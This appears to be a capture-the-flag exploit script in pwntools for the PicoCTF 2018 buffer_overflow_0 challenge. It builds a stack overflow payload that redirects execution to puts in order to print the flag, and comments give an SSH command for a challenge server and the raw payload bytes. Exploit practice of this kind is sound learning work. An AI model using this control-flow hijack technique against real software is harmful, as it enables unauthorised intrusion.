from pwn import  *

context(os='linux', arch='amd64', log_level='debug')
binary = './PicoCTF_2018_buffer_overflow_0'
elf = ELF(binary)

puts_plt = elf.plt['puts']
flag_addr = 0x0804A080
payload = b'a'*(0x18+4) + p32(puts_plt) + p32(1234) + p32(flag_addr)
print(payload)

# ssh -p 26935 CTFMan@node4.buuoj.cn


# aaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0\x84\x04\x08\xd2\x04\x00\x00\x80\xa0\x04\x08